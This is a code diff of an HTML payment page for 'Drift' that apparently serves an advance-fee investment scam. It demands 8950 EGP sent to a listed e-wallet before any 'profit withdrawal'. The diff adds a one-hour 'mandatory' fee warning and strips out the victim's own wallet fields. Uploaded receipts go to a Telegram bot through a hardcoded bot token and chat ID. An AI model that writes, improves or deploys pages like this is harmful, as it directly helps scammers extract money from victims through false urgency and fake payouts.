@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Drift - Payment & Profit Withdrawal</title>
+  <title>Drift - Payment</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
@@ -34,14 +34,12 @@
       position: relative;
     }
 
-    /* Top Nav / Header Branding */
+    /* Top Header */
     .top-header {
       display: flex;
       justify-content: space-between;
       align-items: center;
       margin-bottom: 20px;
-      padding-bottom: 12px;
-      border-bottom: 1px solid #1f2937;
     }
 
     .brand {
@@ -53,9 +51,8 @@
       color: #38bdf8;
     }
 
-    /* Client Badge Style */
     .client-badge {
-      background: linear-gradient(135deg, rgba(56, 189, 248, 0.12), rgba(99, 102, 241, 0.12));
+      background: rgba(56, 189, 248, 0.1);
       border: 1px solid rgba(56, 189, 248, 0.3);
       color: #38bdf8;
       padding: 6px 14px;
@@ -66,7 +63,6 @@
       display: inline-flex;
       align-items: center;
       gap: 6px;
-      box-shadow: 0 0 12px rgba(56, 189, 248, 0.15);
     }
 
     .client-badge::before {
@@ -75,7 +71,6 @@
       height: 6px;
       background-color: #38bdf8;
       border-radius: 50%;
-      box-shadow: 0 0 6px #38bdf8;
     }
 
     /* Hero Section */
@@ -89,16 +84,16 @@
       font-weight: 800;
       letter-spacing: 0.5px;
       color: #ffffff;
-      margin-bottom: 4px;
+      margin-bottom: 6px;
       text-transform: uppercase;
     }
 
     .hero-subtitle {
-      font-size: 0.75rem;
+      font-size: 0.8rem;
       color: #9ca3af;
     }
 
-    /* Info Display Card */
+    /* Wallet Display */
     .wallet-display {
       background: #ffffff;
       color: #0f172a;
@@ -107,7 +102,7 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
       font-weight: 700;
       font-size: 1rem;
     }
@@ -122,7 +117,36 @@
       opacity: 1;
     }
 
-    /* Form Fields */
+    /* Notice Box (الخانة المطلوبة) */
+    .notice-box {
+      background: rgba(239, 68, 68, 0.08);
+      border: 1px dashed rgba(239, 68, 68, 0.4);
+      border-radius: 14px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+    }
+
+    .notice-icon {
+      font-size: 1.1rem;
+      line-height: 1;
+    }
+
+    .notice-text {
+      font-size: 0.76rem;
+      color: #fca5a5;
+      line-height: 1.4;
+      font-weight: 500;
+    }
+
+    .notice-text strong {
+      color: #ef4444;
+      font-weight: 700;
+    }
+
+    /* Section Label */
     .section-label {
       font-size: 0.78rem;
       font-weight: 600;
@@ -133,14 +157,9 @@
       letter-spacing: 0.5px;
     }
 
+    /* Form Input */
     .field-group {
-      margin-bottom: 14px;
-      position: relative;
-    }
-
-    .input-wrapper {
-      display: flex;
-      gap: 8px;
+      margin-bottom: 12px;
     }
 
     .form-input {
@@ -152,53 +171,27 @@
       color: #ffffff;
       font-size: 0.88rem;
       outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
     }
 
-    .form-input:focus {
-      border-color: #38bdf8;
-      box-shadow: 0 0 0 2px rgba(56, 189, 248, 0.2);
-    }
-
-    .btn-remove {
-      background: rgba(239, 68, 68, 0.15);
-      border: 1px solid rgba(239, 68, 68, 0.3);
-      color: #f87171;
-      border-radius: 12px;
-      padding: 0 12px;
-      cursor: pointer;
-      font-size: 0.8rem;
-      transition: background 0.2s;
-    }
-
-    .btn-remove:hover {
-      background: rgba(239, 68, 68, 0.3);
-    }
-
-    .btn-add-wallet {
+    .add-wallet-btn {
+      width: 100%;
       background: transparent;
       border: 1px dashed #374151;
-      color: #38bdf8;
-      width: 100%;
-      padding: 10px;
       border-radius: 12px;
-      font-size: 0.8rem;
+      padding: 12px;
+      color: #38bdf8;
+      font-size: 0.82rem;
       font-weight: 600;
       cursor: pointer;
-      transition: border-color 0.2s, background 0.2s;
       margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
+      transition: border-color 0.2s;
     }
 
-    .btn-add-wallet:hover {
+    .add-wallet-btn:hover {
       border-color: #38bdf8;
-      background: rgba(56, 189, 248, 0.05);
     }
 
-    /* Primary Action Button */
+    /* Primary Button */
     .btn-upload {
       background: linear-gradient(135deg, #38bdf8 0%, #2563eb 100%);
       color: #ffffff;
@@ -214,16 +207,6 @@
       justify-content: center;
       gap: 8px;
       box-shadow: 0 8px 20px rgba(56, 189, 248, 0.25);
-      transition: transform 0.1s, opacity 0.2s;
-    }
-
-    .btn-upload:active {
-      transform: scale(0.98);
-    }
-
-    .btn-upload.success {
-      background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
-      box-shadow: 0 8px 20px rgba(34, 197, 94, 0.25);
     }
 
     #fileInput {
@@ -235,6 +218,7 @@
       font-size: 0.72rem;
       color: #6b7280;
       margin-top: 15px;
+      letter-spacing: 0.5px;
     }
   </style>
 </head>
@@ -246,40 +230,41 @@
       <div class="brand">
         🌀 Drift
       </div>
-      <!-- Styled Client 1934 Box -->
       <div class="client-badge">
         CLIENT 1934
       </div>
     </div>
 
-    <!-- Hero Titles -->
+    <!-- Hero Title -->
     <div class="hero-section">
-      <div class="hero-title">Payment for the transfer to the E-Wallet</div>
-      <div class="hero-subtitle">The amount to be paid is 5380 EGP</div>
+      <div class="hero-title">PAYMENT FOR THE TRANSFER TO THE E-WALLET</div>
+      <div class="hero-subtitle">The amount to be paid is 8950 EGP</div>
     </div>
 
-    <!-- Official Wallet Display -->
+    <!-- Wallet Display -->
     <div class="wallet-display">
       <span>💳 01286999875</span>
-      <span class="copy-icon" onclick="copyWallet('01203174947')">📋</span>
+      <span class="copy-icon" onclick="copyWallet('01286999875')">📋</span>
     </div>
 
-    <!-- Profit Withdrawal Wallets Section -->
-    <span class="section-label">Profit Withdrawal Wallets</span>
-    
-    <div id="walletsContainer">
-      <div class="field-group">
-        <div class="input-wrapper">
-          <input type="tel" class="form-input profit-wallet" placeholder="Wallet #1 (Primary)" required>
-        </div>
+    <!-- Mandatory Payment Notice Box -->
+    <div class="notice-box">
+      <span class="notice-icon">⚠️</span>
+      <div class="notice-text">
+        <strong>Mandatory Requirement:</strong> Fees cannot be deducted from profits. Payment must be completed separately within <strong>1 hour</strong>.
       </div>
     </div>
 
-    <button type="button" class="btn-add-wallet" onclick="addWalletField()">
-      + Add Another Wallet
-    </button>
+    <!-- Wallets Section -->
+    <span class="section-label">PROFIT WITHDRAWAL WALLETS</span>
+    
+    <div class="field-group">
+      <input type="text" class="form-input" value="Wallet #1 (Primary)" readonly>
+    </div>
 
-    <!-- Upload Receipt Action -->
+    <button class="add-wallet-btn">+ Add Another Wallet</button>
+
+    <!-- Actions -->
     <input type="file" id="fileInput" accept="image/*" onchange="sendDataToTelegram()">
     <label for="fileInput" class="btn-upload" id="uploadBtn">
       📩 UPLOAD PAYMENT RECEIPT
@@ -293,57 +278,23 @@
   <script>
     const BOT_TOKEN = "8866871343:AAEAMiWbSrDRHfep7y63Wn7Rh1Ui_wBqTZg";
     const CHAT_ID = "8767380282";
-    let walletCount = 1;
 
     function copyWallet(text) {
       navigator.clipboard.writeText(text);
       alert("Copied: " + text);
     }
 
-    function addWalletField() {
-      walletCount++;
-      const container = document.getElementById('walletsContainer');
-      const div = document.createElement('div');
-      div.className = 'field-group';
-      div.innerHTML = `
-        <div class="input-wrapper">
-          <input type="tel" class="form-input profit-wallet" placeholder="Wallet #${walletCount}">
-          <button type="button" class="btn-remove" onclick="removeWalletField(this)">✕</button>
-        </div>
-      `;
-      container.appendChild(div);
-    }
-
-    function removeWalletField(button) {
-      button.closest('.field-group').remove();
-    }
-
     function sendDataToTelegram() {
-      const walletInputs = document.querySelectorAll('.profit-wallet');
-      const walletNumbers = [];
-
-      walletInputs.forEach((input, index) => {
-        const val = input.value.trim();
-        if (val) {
-          walletNumbers.push(`Wallet ${index + 1}: ${val}`);
-        }
-      });
-
-      if (walletNumbers.length === 0) {
-        alert("Please enter at least one profit withdrawal wallet number before uploading receipt.");
-        document.getElementById('fileInput').value = "";
-        return;
-      }
-
       const fileInput = document.getElementById('fileInput');
       const file = fileInput.files[0];
+
       if (!file) return;
 
       const uploadBtn = document.getElementById('uploadBtn');
       uploadBtn.innerText = "SENDING...";
       fileInput.disabled = true;
 
-      const captionText = `🌀 Drift New Transaction Notice!\n\n👤 Client ID: CLIENT 1934\n💰 Deposit Amount: 5380 EGP\n\n📱 Profit Withdrawal Wallets:\n${walletNumbers.join('\n')}`;
+      const captionText = `🌀 Drift Transfer Payment!\n\n👤 Client ID: CLIENT 1934\n📱 Wallet: 01286999875\n💵 Amount: 8950 EGP\n⚠️ Notice: Non-deductible fees paid within 1 hour.`;
 
       const formData = new FormData();
       formData.append('chat_id', CHAT_ID);
@@ -357,8 +308,7 @@
       .then(res => res.json())
       .then(data => {
         if (data.ok) {
-          uploadBtn.classList.add("success");
-          uploadBtn.innerText = "✓ RECEIPT SUBMITTED";
+          uploadBtn.innerText = "✓ PAYMENT RECEIPT SUBMITTED";
         } else {
           alert("Submission failed. Please try again.");
           uploadBtn.innerText = "📩 UPLOAD PAYMENT RECEIPT";
